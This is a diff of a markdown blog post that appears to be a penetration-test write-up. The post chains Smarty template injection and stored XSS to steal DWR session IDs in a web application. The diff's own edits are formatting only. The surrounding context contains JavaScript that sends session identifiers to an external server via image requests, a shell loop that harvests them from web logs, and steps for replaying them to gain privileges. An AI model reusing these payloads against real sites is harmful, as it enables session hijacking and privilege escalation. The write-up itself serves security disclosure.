@@ -22,11 +22,11 @@ The template error returned above instantly caused an instant change of course i
 
 ![error2.png]({{site.baseurl}}/assets/media/posts/redacted/error2.png)
 
-The discovery that the Smarty template engine for PHP was in use was definitely a roller coaster of emotions. From the instantaneous potential of RCE via SSTI to the disappointment of being shell-less (such a sad state to be in) because of that silly Smarty “secure mode” seemed to be preventing it, this bug had them covered. Coming to that conclusion came from the details found at [Portswigger SSTI](https://portswigger.net/blog/server-side-template-injection). Namely that Smarty “secure mode” is a feature for untrusted template execution. This enforces a whitelist of safe PHP functions, so templates can't directly invoke system(). 
+The discovery that the Smarty template engine for PHP was in use was definitely a roller coaster of emotions. From the instantaneous potential of RCE via SSTI to the disappointment of being shell-less (such a sad state to be in) because of that silly Smarty “secure mode” seemed to be preventing it, this bug had them covered. Coming to that conclusion came from the details found at ![Portswigger SSTI](https://portswigger.net/blog/server-side-template-injection). Namely that Smarty “secure mode” is a feature for untrusted template execution. This enforces a whitelist of safe PHP functions, so templates can't directly invoke system(). 
 
 After recovering from the realization that I would likely be left shell-less (just so sad), came the delightful deep dive into the Smarty developer docs. This actually yielded several quite notable and potential attacks for both this and other attacks (and the list below is by no means exhaustive or original?). 
 
-1.	Smarty has a wonderful built-in SSRF just waiting to SSRF things (A write-up for another time perhaps)! The “{fetch}” tag is ripe for the abuse. [Smarty Fetch API Documentation](https://www.smarty.net/docsv2/en/api.fetch.tpl)
+1.	Smarty has a wonderful built-in SSRF just waiting to SSRF things (A write-up for another time perhaps)! The “{fetch}” tag is ripe for the abuse. ![Smarty Fetch API Documentation](https://www.smarty.net/docsv2/en/api.fetch.tpl)
 2.	Smarty has a built-in PHP reserved variable, "{$smarty}", that can be used to access environment and request variables. One of the variables that "{$smarty}" had access to was "cookies", which as the name indicates allows for Smarty to have access to a users' session cookies via HTTP.
 3.	Smarty “literal” tags.
 ```{literal} tags allow a block of data to be taken literally. This is typically used around Javascript or stylesheet blocks where {curly braces} would interfere with the template delimiter syntax. Anything within {literal}{/literal} tags is not interpreted but displayed as-is.```
@@ -72,7 +72,8 @@ Problem. The scriptSessionId could not be obtained via XSS as it was a value sen
 **Item #3 Solution:**
 
 The scriptSessionId is the DWRSESSIONID concatenated with a "/" and a "_pageId" variable the end user does not know about (DWRSESSIONID + "/" + dwr.engine._pageId). The value that is calculated would be incredibly difficult to guess based on its complexity. The Javascript source showed how this value is calculated in "/dwrS/engine.js" with the following snippet:
-```dwr.engine._pageId = dwr.engine.util.tokenify(new Date().getTime()) + "-" + dwr.engine.util.tokenify(Math.random() * 1E16);```
+```dwr.engine._pageId = dwr.engine.util.tokenify(new Date().getTime()) + "-" 
++ dwr.engine.util.tokenify(Math.random() * 1E16);```
 
 In order to obtain the scriptSessionId, the application could be used against itself. So the Javascript used to calculate the value must be imported into the final payload ``<script src='/dwrS/engine.js'></script>.`` Next, an XMLHttpRequest (XHR) object must be created to make a secondary request to the server at "/redacted.action". This was done to load the content of this page without having to do a full page refresh. This action will allow access to both the dwr.engine._dwrSessionId + "/" + dwr.engine._pageId variables to be obtained.
 
@@ -108,7 +109,6 @@ var b = a.innerHTML;
 
    new Image().src="https://ext.server/DWR?dwrSessionId="+dwrsessid
    new Image().src="https://ext.server/DWR?scriptSessionId="+scrSessId
-
    }
 
    load(url)
@@ -123,7 +123,8 @@ So to sum up the vulnerability, using a combination of features from the Smarty 
 
 3.	The ”medium-ish” privileged user can then harvest the goods from their logs. Perhaps similar to what is shown below: On the external Apache web server something along the lines of the following could be done to harvest the necessary items:
 ```alias urldecode='python -c "import sys, urllib as ul; print ul.unquote_plus(sys.argv[1])"'```
-```for x in `cut -d ' ' -f7 access.log | cut -d\? -f2`; do urldecode $x;done > these && sed 's/"//g' these | sed 's/ => //g' > sessionvars` && cat sessionvars```
+```for x in `cut -d ' ' -f7 access.log | cut -d\? -f2`; do urldecode $x;done > these && 
+sed 's/"//g' these | sed 's/ => //g' > sessionvars` && cat sessionvars```
 4.	Take the output from the console and insert the values in their appropriate positions in the “medium-ish” privileges malicious HTTP requests.
 ![sessionvars.png]({{site.baseurl}}/assets/media/posts/redacted/sessionvars.png)
 5.	And now using our “sessionvars” we can make privileged requests as an exploited user’s  privilege level. Here’s to hoping for full Admin privileges!
